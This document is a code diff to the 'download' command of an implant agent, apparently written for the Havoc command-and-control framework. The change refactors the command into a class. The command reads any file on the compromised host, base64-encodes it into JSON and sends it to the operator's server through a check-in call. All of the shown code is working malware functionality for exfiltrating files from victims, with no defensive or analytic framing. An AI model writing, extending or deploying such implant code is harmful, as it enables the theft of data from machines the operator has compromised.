@@ -4,22 +4,26 @@ using System.IO;
 using System.Linq;
 using System.Security.AccessControl;
 using System.Security.Principal;
-using System.Text;
+using System.Threading.Tasks;
 using System.Text.RegularExpressions;
 using HavocImplant.Communications;
 
 namespace HavocImplant.AgentFunctions
 {
-    public class Download
+    public class Download : CommandInterface
     {
-        public static void Run(Implant agent, string args, int taskId)
+        public override string Command => "download";
+        public override bool Dangerous => false;
+        public override async Task Run(int taskId)
         {
+            Output = "";
             bool isRelativePath = false;
-            string downloadLocation = args.Substring(12);
+            string downloadLocation = Agent.taskingInformation[taskId].taskArguments;
 
             if (downloadLocation.EndsWith("\\") || string.IsNullOrEmpty(downloadLocation))
             {
-                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n Please include the file name in the path to download").Replace("\\", "\\\\"));
+                Output = "Please include the file name in the path to download";
+                ReturnOutput(taskId);
                 return;
             }
 
@@ -36,25 +40,30 @@ namespace HavocImplant.AgentFunctions
                 {
                     byte[] fileBytes = File.ReadAllBytes(downloadLocation);
                     string base64Bytes = Convert.ToBase64String(fileBytes);
+
+                    // yo idk wtf i was on but i aint gonna touch it since it worky with the current handler
                     Dictionary<string, string> FileData = new Dictionary<string, string>();
                     FileData.Add("FileSize", fileBytes.Length.ToString());
                     FileData.Add("FileName", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("\\", "\\\\\\\\"));
                     FileData.Add("FileContent", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n"));
                     string postData = Utils.DictionaryToJson(FileData);
-                    //string jsonString = "{\"FileSize\": \"{1}\", \"FileName\": \"{0}\", \"FileContent\": \"{2}\"".Replace("{1}", fileBytes.Length.ToString()).Replace("{0}", Regex.Replace(downloadLocation, @"\r\n?|\n|\n\r", "\\n").Replace("{2}", Regex.Replace(base64Bytes, @"\r\n?|\n|\n\r", "\\n")));
-                    Comms.CheckIn(agent, postData, "download");
-                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nSuccessfully downloaded {downloadLocation} with {fileBytes.Length} bytes").Replace("\\", "\\\\"));
+
+                    Comms.CheckIn(Agent, postData, "download");
+                    Output = $"Successfully downloaded {downloadLocation} with {fileBytes.Length} bytes";
+                    ReturnOutput(taskId);
                     return;
                 }
                 else
                 {
-                    agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\nCould not download {downloadLocation} due to lack of permissions").Replace("\\", "\\\\"));
+                    Output = $"Could not download {downloadLocation} due to lack of permissions";
+                    ReturnOutput(taskId); 
                     return;
                 }
             }
             else
             {
-                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand.Split(';')[0], ($"[+] Output for [{agent.taskingInformation[taskId].taskCommand.Split(new char[] { ';' }, 2)[0]}]\n{downloadLocation} does not exist").Replace("\\", "\\\\"));
+                Output = $"{downloadLocation} does not exist";
+                ReturnOutput(taskId);
                 return;
             }
         }
